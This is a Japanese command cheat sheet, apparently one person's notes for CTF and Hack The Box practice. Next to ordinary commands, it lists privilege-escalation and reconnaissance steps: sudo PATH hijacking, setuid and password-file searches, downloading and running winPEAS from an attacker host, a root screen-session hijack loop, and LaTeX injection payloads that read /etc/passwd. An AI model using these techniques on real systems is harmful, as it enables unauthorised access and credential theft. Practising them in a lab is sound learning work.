https://linux.just4fun.biz/?%E9%80%86%E5%BC%95%E3%81%8DUNIX%E3%82%B3%E3%83%9E%E3%83%B3%E3%83%89

### sudo 
ユーザ変更用のコマンド
sudo -l で自分が特権を持って使えるコマンドが表示できる
User jaeger may run the following commands on shoppy:
    (deploy) /home/deploy/password-manager
とあるならばdeployというユーザの権限で /home/deploy/password-manager が実行できる
その場合は sudo -u deploy /home/deploy/password-manager　と実行する。

もしも実行したいShell内で相対パスが使われているのなら
相対パスで指定されているファイルの代わりに自分で同名のファイルを作成して
sudo PATH=$PWD:$PATH \[実行したいシェル\]
のようにすると今いるディレクトリを環境変数のPATHに追加した状態で実行できる。

### find

120分前～90分前に更新されたファイルを検索

``` bash
find / -mmin -120 -mmin +90 -ls
```

書き込み権限が設定されているファイルを探索
find / -not -path "/proc/*" -perm -o+w -type f -exec ls -l {} \; 2>/dev/null

setuidやsetgidが設定されている実行ファイルを列挙
find / \( -perm -u+s -or -perm -g+s \) -type f -exec ls -l {} \; 2>/dev/null

「password」「passwords」「passwd」「paswds」等のパスワードを連想させる文字列を名前に含むファイルをカレントディレクトリから検索し、その一覧が表示されます。
find . -type f -regextype posix-egrep -regex ".*pas{1,2}w(or)?ds?.*" 2> /dev/null

### locate
findのようにファイルやディレクトリを検索する(Windows)

### seq
連番の出力に使う。-wで桁埋めしてくれる
``` bash
seq -w 0000 9999
```

### wget
robots.txtを無視するオプション
wget -e robots=off

### ls

指定したディレクトリ内のファイルの詳細を表示

``` bash
ls -l -d `/var/log`
```

### netstat

プロセス名入りでnetstat

``` bash
netstat -anp
```
### /procディレクトリを利用したプロセス情報の取得
https://zsahi.wordpress.com/2018/09/10/file-inclusion/を参考に
```
cat /proc/28346/cmdline
#↑でプロセス実行時のコマンドが見れる
#効率よくやるならBurpのintruderを使ってやるといい。
#/proc/§52573§/cmdline
#PayloadsのtypeをBrute ForcerにしてCharSetを数字だけにする
#プロセス情報が返ってきたレスポンスは長さが長いのでlengthでソートすればわかりやすい****
```

### iptables

``` bash
#文字列指定sudo iptables -A INPUT -p tcp -m string --string "WPScan" --algo bm -j DROP#IP指定sudo iptables -A INPUT -s 192.168.100.45/32 -j DROP#確認sudo iptables -L --line-numbers#保存sudo iptables-save#削除sudo iptables -D INPUT 1
```

https://otiai10.hatenablog.com/entry/2014/08/23/203150

### ldd
指定したプログラムの実行に必要な共有ライブラリを調べるコマンド。
自作のライブラリがなくて実行できないと出る場合はexportを使ってパスを通してやる必要がある。
```
export LD_LIBRARY_PATH=./
```

### copy

Windowsでファイルを結合するためのコマンド
/bでバイナリとして結合する指定

``` cmd
copy /b a+b+c d.zip
```

### nc

外部のサーバと通信する時のコマンド
プロキシを経由させる場合は以下のように

``` linux 
nc 3.19.22.162 8001 -x 192.168.100.242:60080 -X connect
```

### google Colaboratory

googleの開発サービス
pythonを記述できるが、「!」をつけて記述するとコマンドが実行できる。ウィンドウを閉じるまで維持されるので、プロキシを経由させたくない時に使える。

https://colab.research.google.com/notebooks/welcome.ipynb?hl=ja#scrollTo=-gE-Ez1qtyIA

```
!apt install netcat
```

```
!nc 153.120.138.163 50000
```

### Powershell

Powershellで-encを使うときはUTF-16LEでエンコードした後にBase64にしないといけないので、Cyberchefで「Encode text」（UTF-16LE(1200)）と「To Base64」を行う。この時ファイルのままではなくきちんとソースをコピペしないと動かない

### Powershellでのファイルのダウンロード
Invoke-WebRequest -Uri "http://10.10.16.219/winPEASx64.exe" -outfile winPEASx64.exe
.\winPEASx64.exe

### ping
192.168.140.12などの形式でなくても3512839719とかでも送れる。


### Linuxのパスワード変更
passwd <ユーザ名>
<ユーザ名>なしだと自分のパスワードを変更する

### smbclient.exe(Windows)
smbclient [IP]
open [IP]
login [username]
shares
という感じで見ていく
unknown encoding: cp65001
なんていうエラーが出た場合は
chcp 932
で文字のエンコード形式を変える

### smbclient(Linux)
smbclient -L 10.129.161.170
smbclient //10.129.161.170/backups
get prod.dtsConfig

### screen
screenはセッションが切れても再開できるようにする為のもの。rootが作ったセッションがあればそれを利用してrootになれる

```
#セッションを保存する
/bin/sh -c while true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root ;; done

#セッションを再開する
screen -r

#セッションの状態を調べる
screen -ls

```

### tex
ドキュメントを記述したりする言語。

ファイルの読み込みなどもでき、文字列の結合などもできるようになっている
ファイルの読み込みその１
```
\documentclass{article}
\usepackage{verbatim}　＃verbatiminputの入ったパッケージを使うための宣言
\begin{document}

\def \fl {fl} #変数宣言と初期値の入力
\def \ag {ag} ＃変数宣言と初期値の入力

\verbatiminput{\fl\ag} #変数を結合し、その名前のファイルを呼び出し

\end{document}
```
その２
```
\documentclass{article}
\begin{document}

$$\input{/etc/passwd}$$ #\inputでファイルの呼び出しができるが、_が入っているとエラーになってしまうので$$で挟んで数式モードにしている。こうすると_は直後の文字を下付き文字にするようになるのでそこだけ直せばよい

\end{document}

```

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection

### anbox
linux上でandroidのapkを動かすためのエミュレータ

``` bash
sudo apt install snapd
sudo systemctl start snapd
sudo systemctl enable snapd
sudo systemctl status snapd
sudo snap install --devmode --beta anbox
sudo snap refresh --beta --devmode anbox
snap info anbox
sudo apt install adb
sudo adb start-server
sudo adb install RouterSpace.apk
#インストールできない時は以下を
adb devices　#オフラインになってないか確認
sudo adb kill-server
sudo adb start-server
adb devices #これで直ってればOK
sudo netstat -anp | grep 5559 #ここの番号はadb devicesのemulator-****の部分+1の数。プロセスが立ち上がっている場合はkillする
adb devices #emulator-****がなくなっていればOK
sudo adb install RouterSpace.apk #これで入るはず
adb devices #emulator-****が増えてdeviceとか表示されているはず
#ここまで
anbox.appmgr #なんかエラーが出るけど動くはず
#adbのプロキシ設定
ip a #anboxのIPを確認
#burpのproxy->optionsでanboxのIPでリッスンするように設定する。ポートもわけた方がいいかも
sudo ufw allow 8081 #burp用のポートを開放。いらないかも？
sudo ufw reload #ufwの更新
adb shell settings put global http_proxy 192.168.250.1:8081 #adb側のproxyの設定
#もし間違えたら以下の3行で消す
adb shell settings delete global http_proxy
adb shell settings delete global global_http_proxy_host
adb shell settings delete global global_http_proxy_port
#ここまで
```
